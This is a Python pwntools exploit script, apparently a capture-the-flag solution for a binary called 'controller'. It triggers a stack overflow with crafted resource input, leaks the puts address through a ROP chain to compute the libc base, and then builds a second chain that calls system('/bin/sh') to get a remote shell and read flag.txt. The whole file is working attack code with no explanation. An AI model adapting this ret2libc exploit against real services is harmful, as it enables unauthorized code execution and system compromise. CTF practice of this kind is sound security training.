from pwn import *

elf = ELF("controller")
elf_rop = ROP(elf)
libc = ELF("libc.so.6")

gadget_pop_rdi = elf_rop.find_gadget(['pop rdi', 'ret'])[0]
gadget_ret = elf_rop.find_gadget(['ret'])[0]

offset_overflow = b"A" * (0x28)

conn = remote(MACHINE_IP, MACHINE_PORT)

def prepare_overflow():
    conn.recvuntil("Insert the amount of 2 different types of recources: ")
    conn.sendline("-32669 -2")
    conn.recvuntil("> ")
    conn.sendline("3")
    conn.recvuntil("> ")

def retrieve_libc_base():
    with log.progress("retrieving libc base") as progress:
        progress.status("forging rop")
        rop = offset_overflow
        rop += p64(gadget_pop_rdi)
        rop += p64(elf.got["puts"])
        rop += p64(elf.plt["puts"])
        rop += p64(elf.symbols["main"])

        progress.status("waiting for overflow preparation")
        prepare_overflow()

        progress.status("sending overflow")
        conn.sendline(rop)
        conn.recvline()

        progress.status("calculating libc base address")
        leak = conn.recvline().strip()
        leak = u64(leak.ljust(8, b"\x00"))
        libc.address = leak - libc.symbols["puts"]

def retrieve_shell():
    with log.progress("retrieving a shell") as progress:
        progress.status("forging rop")
        rop = offset_overflow
        rop += p64(gadget_ret)
        rop += p64(gadget_pop_rdi)
        rop += p64(next(libc.search(b"/bin/sh")))
        rop += p64(libc.sym["system"])
        rop += p64(libc.sym["exit"])

        progress.status("waiting for overflow preparation")
        prepare_overflow()

        progress.status("sending overflow")
        conn.sendline(rop)
        conn.recvline()

retrieve_libc_base()
retrieve_shell()

conn.sendline("cat flag.txt")
log.success(conn.recvlineS())
